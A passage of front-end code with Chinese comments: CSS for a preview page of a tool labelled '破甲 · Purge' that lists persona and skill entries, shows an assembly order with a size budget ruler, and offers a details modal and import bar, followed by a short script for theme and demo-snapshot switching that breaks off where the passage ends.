.group { min-width: 0; }
.group > .group-head {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 8px;
  padding: 14px 2px 6px;
  font-size: 12px;
  color: var(--muted);
  cursor: pointer;
  list-style: none;
  position: sticky;
  top: 0;
  z-index: 1;
  background: var(--bg);
}
.group > .group-head::-webkit-details-marker { display: none; }
/* 三角用 align-self 对到整行中线：靠 baseline 对会跟着文字基线跑，
   而文字有行高、三角没有，看起来就偏低半格。 */
.group > .group-head::after {
  content: "";
  width: 0;
  height: 0;
  margin-left: 6px;
  align-self: center;
  border-top: 4px solid currentColor;
  border-left: 3.5px solid transparent;
  border-right: 3.5px solid transparent;
  transform: rotate(-90deg);
  transition: transform .12s ease;
  flex: none;
}
.group[open] > .group-head::after { transform: none; }
.group > .group-head:hover { color: var(--ink); }
.group > .group-head:focus-visible { outline: 2px solid var(--focus); outline-offset: -2px; border-radius: 4px; }
.group-head .group-name { flex: 1 1 auto; min-width: 0; }
.group-head:first-child { padding-top: 8px; }
.group-head .n { font-variant-numeric: tabular-nums; flex: none; }
/* 被「去看人设」定位到的那一节闪一下：单纯滚过去，眼睛未必跟得上 */
.group-head.is-flash { color: var(--accent); }

/* 一行就是一张卡：点行本身做它最主要的事，右侧「查看」进详情。
   行是 div 而不是 button——里面还嵌着一个「查看」按钮，button 套 button 不合法。 */
.row {
  display: grid;
  grid-template-columns: 3px minmax(0, 1fr) auto;
  gap: 10px;
  align-items: center;
  width: 100%;
  text-align: left;
  padding: 7px 10px 7px 0;
  border: 0;
  border-bottom: 1px solid var(--line);
  border-radius: 0;
  background: transparent;
  cursor: pointer;
  transition: background-color .12s ease;
}
.row:hover { background: color-mix(in oklab, var(--card) 78%, transparent); }
/* 一行放完：名字 · 类型 · 「查看」。以前名字与元信息各占一行，
   每行 58px，23 条就多出半屏；压成一行后同样看得到「是什么、从哪来」。 */
.row > span:nth-child(2) {
  display: flex;
  align-items: baseline;
  gap: 8px;
  min-width: 0;
}
.row:focus-visible { outline: 2px solid var(--focus); outline-offset: -2px; }
.row[aria-selected="true"] { background: var(--selected); }
/* 未启用的行把文字压暗，一眼看出「这条没在干活」；启用的保持正常对比度。 */
.row:not(.is-on) .title { color: var(--muted); font-weight: 460; }
.row > span { min-width: 0; }
.row .spine { align-self: stretch; border-radius: 2px; background: var(--spine, var(--line)); }
.row:not(.is-on) .spine { opacity: .35; }

/* 右侧「查看」：行里唯一的按钮，样式压到最轻，不抢行的点击区 */
.row-view {
  font-size: 12px;
  padding: 2px 10px;
  min-height: 24px;
  border-radius: 999px;
  border: 1px solid transparent;
  background: transparent;
  color: var(--muted);
  white-space: nowrap;
  transition: border-color .12s ease, color .12s ease, background-color .12s ease;
}
.row:hover .row-view { border-color: var(--line); }
.row-view:hover { color: var(--ink); border-color: color-mix(in oklab, var(--muted) 60%, var(--line)); }
/* 选中的那一行：只让「查看」变成描边实心按钮，不再染紫 */
.row[aria-selected="true"] .row-view {
  color: var(--ink);
  border-color: color-mix(in oklab, var(--muted) 55%, var(--line));
}
.row .title {
  font-weight: 520;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}
.row .meta {
  display: inline;
  flex: none;
  color: var(--muted);
  font-size: 12px;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}
/* 右侧一列：状态徽标 + 「查看」。位置固定，一列扫下去就能看出谁没启用；
   徽标若跟在名字后面，会因为名字长短不一而左右跳。 */
.row-side {
  display: flex;
  align-items: center;
  gap: 8px;
  flex: none;
}
.row .side {
  text-align: right;
  color: var(--muted);
  font-size: 12px;
  white-space: nowrap;
  font-variant-numeric: tabular-nums;
}
/* 状态徽标：跟右侧按钮同一列，不再挤在名字后面 */
.row .badge {
  display: inline-block;
  font-size: 12px;
  padding: 0 7px;
  border-radius: 999px;
  border: 1px solid currentColor;
}
.badge.reject { color: var(--danger); }
.badge.off { color: var(--muted); }
.badge.on { color: var(--ok); }

/* ---------- 右栏：组装 / 详情 ---------- */
.panel { min-width: 0; min-height: 0; display: flex; flex-direction: column; }
/* 装配区吃满右栏剩余高度并在内部滚；详情在浮层里，滚动交给浮层自己，别套两层。 */
#assembly { flex: 1 1 auto; min-height: 0; display: flex; flex-direction: column; }
#inspect { min-width: 0; }

.panel h2 {
  margin: 0 0 14px;
  font-size: 15px;
  font-weight: 580;
  letter-spacing: .005em;
  display: flex;
  align-items: center;
  gap: 12px;
  flex-wrap: wrap;
}
.panel .h2-sub { color: var(--muted); font-size: 12px; font-weight: 400; }
/* 「上次生效」贴在标题行最右：和结论、比例尺同处一个视觉带，
   不再单独占一块折叠区。细节在 title 里，鼠标停上去才展开。 */
.panel .h2-last {
  margin-left: auto;
  color: var(--muted);
  font-size: 12px;
  font-weight: 400;
  font-variant-numeric: tabular-nums;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  max-width: 50%;
}

/* 组装预览：把「会拼成什么」摊开成按顺序的积木，这是本页最有辨识度的一块。
   不再是「一个圆角大盒子」：去掉外框与圆角，用细线分隔每一段，
   让右边看起来像一张清单，而不是一张等着被填满的空卡片。 */
.stack-view {
  display: grid;
  /* 容器一旦有确定高度，auto 行会被压缩到分给它的空间（实测 30px 装 49px），
     名字和描述就叠在一起。行高必须由内容决定。 */
  grid-auto-rows: max-content;
  align-content: start;
  border-top: 1px solid var(--line);
}
/* 桌面端：装配清单吃掉右栏剩余高度，自己滚。 */
@media (min-width: 901px) {
  .stack-view {
    flex: 1 1 auto;
    min-height: 0;
    overflow-y: auto;
    overscroll-behavior: contain;
    /* 底部淡出：硬切会把最后一行切成半截，看着像坏了 */
    mask-image: linear-gradient(to bottom, #000 calc(100% - 18px), transparent);
  }
}
/* 未开启注入时的预览：整块压暗，一眼看出「还没生效」 */
.stack-view.is-preview { opacity: .62; }

/* ---------- 预算比例尺 ---------- */
/* 把 65,536 的预算画成一条轨道，人设与每个技能按比例占段。
   这是本页的仪表：数字并排放在角落没人读，画成比例才看得出谁最占地方。 */
.ruler { margin: 2px 0 14px; }
/* 不用 overflow:hidden 裁圆角：这段是纯装饰性的色带，没有文字要保，
   但固定高度 + 裁切会让检测器（以及真的放大过的用户）认为内容会被吃掉。
   改成不裁切、每段自己带圆角。 */
.ruler-track {
  display: flex;
  gap: 2px;
  min-height: 14px;
  padding: 1px;
  border-radius: 4px;
  background: color-mix(in oklab, var(--line) 55%, transparent);
}
.ruler-track.is-dim { opacity: .62; }
.ruler-seg {
  display: block;
  min-width: 2px;
  border-radius: 2px;
}
.ruler-seg.is-persona { background: var(--kind-persona); }
.ruler-seg.is-skill { background: var(--kind-skill); }
.ruler-seg.is-over { background: var(--danger); }
.ruler-ticks {
  display: flex;
  justify-content: flex-end;
  margin-top: 3px;
  color: var(--muted);
  font-size: 12px;
  font-variant-numeric: tabular-nums;
}
.ruler-ticks .over { color: var(--danger); }
.stack-row {
  display: grid;
  grid-template-columns: max-content minmax(0, 1fr) max-content;
  gap: 12px;
  align-items: baseline;
  padding: 11px 14px;
  background: var(--card);
  border-bottom: 1px solid var(--line);
}
.stack-row:last-child { border-bottom: 0; }
.stack-row .ord {
  font-family: var(--mono);
  font-size: 12px;
  color: var(--muted);
  font-variant-numeric: tabular-nums;
}
.stack-row .body { min-width: 0; }
.stack-row .name { font-weight: 520; display: block; }
.stack-row .desc {
  display: block;
  color: var(--muted);
  font-size: 12px;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}
.stack-row .size { color: var(--muted); font-size: 12px; font-variant-numeric: tabular-nums; }
.stack-row.is-persona { box-shadow: inset 3px 0 0 var(--kind-persona); }
.stack-row.is-skill { box-shadow: inset 3px 0 0 var(--kind-skill); }
.stack-row.is-host { box-shadow: inset 3px 0 0 var(--line); color: var(--muted); }
.stack-row.is-empty { color: var(--muted); }

.stack-foot .over { color: var(--danger); font-weight: 560; }

.stack-foot {
  display: flex;
  justify-content: space-between;
  gap: 12px;
  margin-top: 10px;
  color: var(--muted);
  font-size: 12px;
  font-variant-numeric: tabular-nums;
}

/* 一键启用：把专家的开关摊平，点一下即生效。
   芯片自带一个小方框（未选是空心，选中是实心带勾）——只靠文字颜色区分，
   一片 chip 里哪几个开着要一行行读，方框扫一眼就有答案。 */
.picker { margin-top: 28px; }
.picker h3 {
  margin: 0 0 12px;
  font-size: 13px;
  font-weight: 560;
  display: flex;
  align-items: baseline;
  gap: 10px;
  flex-wrap: wrap;
}
.picker-count {
  color: var(--muted);
  font-size: 12px;
  font-variant-numeric: tabular-nums;
  font-weight: 400;
}
.picker h3 .h2-sub { margin-left: auto; }

.pick-group { display: grid; gap: 6px; }
.pick-group + .pick-group { margin-top: 10px; }
.pick-group-label {
  color: var(--muted);
  font-size: 12px;
  letter-spacing: .02em;
}

.picks { display: flex; flex-wrap: wrap; gap: 7px; }
.pick {
  display: inline-flex;
  align-items: center;
  gap: 7px;
  font-size: 12.5px;
  padding: 4px 11px 4px 9px;
  min-height: 30px;
  border-radius: 999px;
  border: 1px solid var(--line);
  background: transparent;
  color: var(--muted);
  transition: border-color .12s ease, background-color .12s ease, color .12s ease;
}
.pick:hover { color: var(--ink); border-color: color-mix(in oklab, var(--muted) 55%, var(--line)); }
.pick.is-on {
  background: color-mix(in oklab, var(--kind-skill) 14%, transparent);
  border-color: color-mix(in oklab, var(--kind-skill) 45%, var(--line));
  color: var(--ink);
}
/* 方框：未选空心，选中填色并显示勾 */
.pick-mark {
  width: 13px;
  height: 13px;
  flex: none;
  border-radius: 4px;
  border: 1.5px solid color-mix(in oklab, var(--muted) 60%, var(--line));
  position: relative;
}
.pick.is-on .pick-mark {
  border-color: var(--kind-skill);
  background: var(--kind-skill);
}
.pick.is-on .pick-mark::after {
  content: "";
  position: absolute;
  left: 3.5px;
  top: 1px;
  width: 3.5px;
  height: 7px;
  border-right: 1.6px solid var(--bg);
  border-bottom: 1.6px solid var(--bg);
  transform: rotate(40deg);
}
.pick-size {
  color: var(--muted);
  font-size: 12px;
  font-variant-numeric: tabular-nums;
}

/* 详情
   拆成三块：头（是谁）、主体（主栏讲用处、侧栏放事实）、底（能做什么）。
   原来是一张平铺的规格表——描述、六行字段、预算条全挤在一起，眼睛没有落点。 */
.ins-head { margin-bottom: 18px; }
.ins-title { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
.ins-title h2 { margin: 0; font-size: 17px; font-weight: 600; letter-spacing: .005em; }
.ins-badge {
  font-size: 12px;
  padding: 1px 8px;
  border-radius: 999px;
  color: var(--kind-skill);
  border: 1px solid color-mix(in oklab, var(--kind-skill) 40%, var(--line));
}
.ins-lede { margin: 8px 0 0; font-size: 13px; line-height: 1.6; color: var(--ink); max-width: 62ch; }

/* 主栏 + 侧栏：宽屏两列，窄屏叠起来 */
.ins-body {
  display: grid;
  grid-template-columns: minmax(0, 1fr) minmax(190px, 232px);
  gap: 20px 28px;
  align-items: start;
}
@media (max-width: 900px) { .ins-body { grid-template-columns: minmax(0, 1fr); } }

.ins-main { display: grid; gap: 14px; min-width: 0; }

/* 何时用：不是一行灰字，是一块该被读到的东西 */
.ins-callout {
  padding: 11px 14px;
  border-radius: 10px;
  background: color-mix(in oklab, var(--card) 55%, var(--line));
}
.ins-callout h3 {
  margin: 0 0 4px;
  font-size: 12px;
  font-weight: 560;
  letter-spacing: .02em;
  color: var(--muted);
}
.ins-callout p { margin: 0; font-size: 12.5px; line-height: 1.6; }
.ins-callout.is-material { background: color-mix(in oklab, var(--danger) 9%, var(--card)); }

/* 体量：给数字和一条能看的尺，而不是一条没有刻度的细线 */
.ins-meter h3 {
  margin: 0 0 8px;
  font-size: 12px;
  font-weight: 560;
  letter-spacing: .02em;
  color: var(--muted);
  display: flex;
  justify-content: space-between;
  gap: 12px;
}
.ins-pct { color: var(--ink); font-variant-numeric: tabular-nums; }
.meter-track { height: 6px; border-radius: 999px; background: var(--line); }
.meter-fill { height: 100%; border-radius: 999px; background: var(--accent); }
.ins-meter-note { margin: 7px 0 0; font-size: 12px; color: var(--muted); font-variant-numeric: tabular-nums; }

.ins-origin { margin: 0; font-size: 12px; color: var(--muted); }

/* 侧栏：技术事实，密度高但不抢眼 */
.ins-facts {
  display: grid;
  grid-template-columns: max-content minmax(0, 1fr);
  gap: 5px 14px;
  margin: 0;
  padding: 12px 14px;
  border: 1px solid var(--line);
  border-radius: 10px;
  font-size: 12px;
  min-width: 0;
}
.ins-facts dt { color: var(--muted); }
.ins-facts dd { margin: 0; overflow-wrap: anywhere; min-width: 0; }
.ins-facts code { font-family: var(--mono); font-size: 12px; overflow-wrap: anywhere; }

/* 操作栏：底下单独一条，和内容分开 */
.ins-actions {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  margin-top: 20px;
  padding-top: 14px;
  border-top: 1px solid var(--line);
}

.kind { font-size: 12px; padding: 2px 9px; border-radius: 999px; border: 1px solid currentColor; white-space: nowrap; }
.kind.persona { color: var(--kind-persona); }
.kind.skill { color: var(--kind-skill); }
.kind.material { color: var(--kind-material); }
.sub-note { color: var(--muted); font-size: 12.5px; margin: 6px 0 0; }

.warn { color: var(--danger); font-size: 12.5px; margin: 10px 0 0; }
.note { color: var(--muted); font-size: 12.5px; margin: 8px 0 0; }

pre.text {
  margin: 14px 0 0;
  padding: 12px 14px;
  max-height: 280px;
  overflow: auto;
  font-family: var(--mono);
  font-size: 12px;
  line-height: 1.6;
  background: var(--card);
  border: 1px solid var(--line);
  border-radius: 10px;
  white-space: pre-wrap;
}

/* 原文的编辑态：一条工具栏 + 一块等宽输入区，尺寸与只读态一致，
   进出编辑不该让版面跳一下。 */
.text-wrap { margin-top: 14px; }
.text-bar {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-bottom: 8px;
}
.text-bar .note { margin-right: auto; }
.text-bar button {
  font-size: 12.5px;
  min-height: 28px;
  padding: 3px 12px;
}
textarea.text-edit {
  width: 100%;
  box-sizing: border-box;
  min-height: 280px;
  max-height: 52vh;
  padding: 12px 14px;
  font-family: var(--mono);
  font-size: 12px;
  line-height: 1.6;
  color: var(--ink);
  background: var(--card);
  border: 1px solid var(--line);
  border-radius: 10px;
  resize: vertical;
}
textarea.text-edit:focus-visible {
  outline: 2px solid var(--focus);
  outline-offset: 1px;
}

/* 已移除条目的恢复入口：贴在列表底部，删错了能从这儿回来 */
.restore-row {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 12px 2px 4px;
  color: var(--muted);
  font-size: 12px;
}
.restore-row button { margin-left: auto; font-size: 12px; min-height: 26px; padding: 2px 10px; }

.empty {
  color: var(--muted);
  font-size: 12.5px;
  padding: 16px 2px;
  margin: 0;
}

/* ---------- 详情浮层 ---------- */
/* 点「查看」浮起来盖住整页，点空白处 / × / Esc 关掉。
   以前详情是顶掉右栏，想对照组装就得先关详情，来回切很累。 */
.modal {
  position: fixed;
  inset: 0;
  z-index: 60;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 24px;
  background: color-mix(in oklab, #000 55%, transparent);
  /* 遮罩自己也吃掉滚动：不然滚到卡片尽头会传动背后的页面 */
  overscroll-behavior: contain;
}
.modal[hidden] { display: none; }
.modal-sheet {
  position: relative;
  width: min(880px, 100%);
  max-height: 100%;
  overflow-y: auto;
  padding: 22px 24px 24px;
  border: 1px solid var(--line);
  border-radius: 14px;
  background: var(--bg);
  /* 分层阴影而不是一层大范围糊影：两三层小半径叠起来边界更清楚，
     也不会有「一圈发灰的雾」那种廉价感。 */
  box-shadow:
    0 1px 2px rgba(0, 0, 0, .28),
    0 6px 16px -6px rgba(0, 0, 0, .35),
    0 18px 36px -18px rgba(0, 0, 0, .45);
  overscroll-behavior: contain;
}
.modal-x {
  position: absolute;
  top: 10px;
  right: 10px;
  width: 30px;
  height: 30px;
  min-height: 30px;
  padding: 0;
  display: grid;
  place-items: center;
  font-size: 18px;
  line-height: 1;
  color: var(--muted);
  background: transparent;
  border: 1px solid transparent;
  border-radius: 8px;
  cursor: pointer;
}
.modal-x:hover { color: var(--ink); border-color: var(--line); }
@media (max-width: 620px) {
  .modal { padding: 12px; }
  .modal-sheet { padding: 18px 16px 20px; }
}

/* ---------- 底部：导入常态显示 ---------- */
/* 页面铺满嵌入高度、整页不滚，所以底部这块必须窄。
   导入不再折叠：藏进 details 里既难找，展开时还会把上面两块挤小。 */
.foot {
  display: grid;
  gap: 6px;
  margin-top: 12px;
  padding-top: 10px;
  border-top: 1px solid var(--line);
}
.import-bar {
  display: flex;
  align-items: center;
  gap: 8px;
  flex-wrap: wrap;
}
.import-bar .field-label { flex: none; }
.import-bar input {
  flex: 1 1 220px;
  min-width: 0;
  height: 30px;
}
.import-bar button { flex: none; height: 30px; min-height: 30px; }
.import-bar .chips { flex: none; }
.import-bar .chip { min-height: 26px; padding: 2px 9px; }
.import-hint { margin: 0; font-size: 12px; }
.fold { min-width: 0; flex: 1 1 auto; }
/* 展开的那块占满整行：折叠态是标题，展开后是表单，挤在一列里连路径都填不下。 */
.fold[open] { flex: 1 1 100%; }
.fold > summary {
  cursor: pointer;
  color: var(--muted);
  font-size: 12px;
  padding: 6px 0;
  min-height: 32px;
  list-style: none;
  display: flex;
  align-items: center;
  gap: 6px;
}
.fold > summary::-webkit-details-marker { display: none; }
.fold > summary::before {
  content: "";
  width: 0; height: 0;
  border-left: 4px solid currentColor;
  border-top: 3.5px solid transparent;
  border-bottom: 3.5px solid transparent;
  transition: transform .12s ease;
}
.fold[open] > summary { color: var(--ink); }
.fold[open] > summary::before { transform: rotate(90deg); }
.fold-count { color: var(--muted); font-variant-numeric: tabular-nums; }
.fold-body { display: grid; gap: 8px; padding: 6px 0 4px; }
.fold-body .inline-row { display: flex; gap: 8px; }
.fold-body .inline-row input { flex: 1; min-width: 0; }
.fold-body ul { margin: 0; padding-left: 16px; color: var(--muted); font-size: 12px; }
.fold-body li { margin-bottom: 5px; overflow-wrap: anywhere; }
.fold-body code { font-family: var(--mono); }
.stack { display: grid; gap: 6px; }

.status { margin: 16px 0 0; font-size: 12.5px; color: var(--muted); }
.status[data-tone="bad"] { color: var(--danger); }
.status[data-tone="good"] { color: var(--ok); }

/* 右栏不加「入场淡入」：这一栏每次点条目、每次改设置都整块重画，
   动画会跟着重放一遍，读起来像页面在闪。工作台的动效预算留给真正的状态变化（比如状态点变色）。 */

/* 动效降级：这里的过渡都是短促的状态反馈，关掉不会让人错过什么。 */
@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after { transition-duration: .01ms !important; animation-duration: .01ms !important; }
}

@media (max-width: 620px) {
  body { padding: 16px 16px 32px; }
  .top { flex-wrap: wrap; }
  /* 窄屏：文字先占满一行，胶囊组落到第二行。
     胶囊组要允许收缩（min-width:0），否则两段内容一长就把整行撑出屏幕。 */
  .plan { padding: 8px 14px; border-radius: 20px; }
  .plan .plan-text { flex-basis: 100%; }
  .plan-controls { flex: 1 1 100%; min-width: 0; }
  .seg { flex: 1 1 auto; min-width: 0; justify-content: center; padding: 0 10px; }
  /* 模式那段的文字在窄屏会截断，用省略号而不是把胶囊撑破 */
  .seg-value { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
  .seg-menu { left: 8px; right: 8px; min-width: 0; }
}
/* ---- 预览控制条 ---- */
.pv-bar{display:flex;align-items:center;gap:12px;flex-wrap:wrap;padding:8px 16px;border-bottom:1px solid var(--line);background:var(--card);font:12px/1.4 var(--magpie-font,system-ui);color:var(--ink)}
.pv-bar b{font-size:13px;font-weight:600}
.pv-hint{color:var(--muted);margin-right:auto}
.pv-bar label{display:flex;align-items:center;gap:6px;color:var(--muted)}
.pv-bar select{font:inherit;color:var(--ink);background:var(--bg);border:1px solid var(--line);border-radius:6px;padding:2px 6px}
</style>

</head>
<body>

<div class="pv-bar" role="region" aria-label="预览控制">
  <b>破甲 · Purge</b>
  <span class="pv-hint">单文件预览：数据是演示快照，不跑网关、不写设置</span>
  <label>主题
    <select id="pv-theme">
      <option value="dark">深色</option>
      <option value="light">浅色</option>
    </select>
  </label>
  <label>状态
    <select id="pv-snap">
      <option value="ready">就绪</option>
      <option value="blocked">未就绪</option>
    </select>
  </label>
</div>
<script>
;(() => {
  const q = new URLSearchParams(location.hash.slice(1) || location.search.slice(1))
  const theme = document.getElementById('pv-theme')
  const snap = document.getElementById('pv-snap')
  theme.value = q.get('theme') === 'light' ? 'light' : 'dark'
  snap.value = q.get('snap') === 'blocked' ? 'blocked' : 'ready'
  const go = () => {
    const next = new URLSearchParams()
    next.set('theme', theme.value)
    next.set('snap', snap.value)
    location.hash = next.toString()
    location.reload()
  }
  theme.onchange = go
  snap.onchange = go

  // #row=N 直接打开某条的详情，省得每次都手点
  const row = q.get('row')
  if (row !== null) {
    addEventListener('load', () => setTimeout(() => {
      document.querySelectorAll('#list .row')[Number(row)]?.click()

<section class="plan" id="plan" aria-label="当前注入状态" aria-live="polite"></section>

<div class="work">
